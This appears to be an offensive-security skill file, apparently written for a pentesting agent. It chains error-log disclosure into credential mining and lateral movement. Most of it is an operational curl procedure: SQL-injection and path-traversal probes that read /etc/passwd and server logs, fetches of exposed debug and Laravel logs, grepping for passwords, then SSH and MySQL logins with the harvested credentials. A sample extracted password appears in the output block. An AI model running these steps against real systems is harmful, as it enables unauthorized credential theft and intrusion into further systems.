---
name: error-log-credentials
description: Chain error log disclosure → credential mining → lateral movement
version: 1.0.0
phase: chains
category: chaining
tags: [error-logs, credentials, disclosure, lateral-movement]
tools: [curl]
difficulty: intermediate
opsec_level: medium
time_estimate: 5m
severity_if_found: high
related_skills:
  - credential-harvest
  - lateral-movement
mitre_attack:
  - T1552.001
  - T1021
---

## When to Use

Use this skill when verbose error messages or accessible log files reveal
credentials, database connection strings, or internal paths. Chain error
disclosure → credential extraction → lateral movement to other systems.

## Prerequisites

- curl
- Target with verbose error messages or exposed log files
- Error logs accessible via web or LFI

## Procedure

```bash
# STEP 1: Trigger verbose error messages
curl -sk "https://TARGET/login.php" -d "user=' OR 1=1--&pass=x"
curl -sk "https://TARGET/index.php?page=../../../../etc/passwd%00"
curl -sk "https://TARGET/api/nonexistent" 2>/dev/null | head -50

# STEP 2: Check for exposed log files
curl -sk "https://TARGET/error.log" 2>/dev/null | head -20
curl -sk "https://TARGET/logs/error.log" 2>/dev/null | head -20
curl -sk "https://TARGET/wp-content/debug.log" 2>/dev/null | head -20
curl -sk "https://TARGET/var/log/apache2/error.log" 2>/dev/null | head -20

# STEP 3: Search error logs for credentials
curl -sk "https://TARGET/wp-content/debug.log" 2>/dev/null | \
  grep -iE "password|pass=|pwd=|mysql.*connect|database"

# STEP 4: Extract database credentials from error messages
curl -sk "https://TARGET/index.php?page=../../../../var/log/apache2/access.log%00" 2>/dev/null | \
  grep -iE "password|auth|login"

# STEP 5: Check for debug endpoints
curl -sk "https://TARGET/debug" 2>/dev/null | head -30
curl -sk "https://TARGET/_profiler" 2>/dev/null | head -30
curl -sk "https://TARGET/phpinfo.php" 2>/dev/null | grep -i "error_log\|log_errors"

# STEP 6: Mine credentials from application logs
curl -sk "https://TARGET/storage/logs/laravel.log" 2>/dev/null | \
  grep -iE "password|db_password|redis_password|smtp"

# STEP 7: Use extracted credentials for lateral movement
# SSH with found credentials
ssh -o StrictHostKeyChecking=no USER@TARGET_IP

# Database access with found credentials
mysql -h TARGET_IP -u DB_USER -pDB_PASSWORD
```

## OPSEC Rules

- Do not inject malicious SQL — use only for error disclosure
- Document all exposed log files and their contents
- Do not modify log files
- Clean up any test injections from logs
- Log all credential findings for audit trail

## Verification

- Confirm error messages reveal sensitive information
- Verify extracted credentials are valid
- Test lateral movement with found credentials
- Check if logs are accessible without authentication

## Pitfalls

- Error display may be disabled in production
- Log files may be outside web root
- Some applications sanitize error messages
- Credentials in logs may be encrypted or hashed
- Log rotation may have removed old entries
- Access logs may require authentication

## Output Format

```
[CHAIN] Error Log → Credential Mining chain successful
  Step 1: Verbose error messages enabled (PHP stack trace)
  Step 2: Debug log accessible: /wp-content/debug.log
  Step 3: Database credentials found: wp_user:DbP@ss123
  Step 4: Lateral movement via SSH successful
  Findings: 2 credential pairs extracted
  Severity: HIGH (8.0)
```
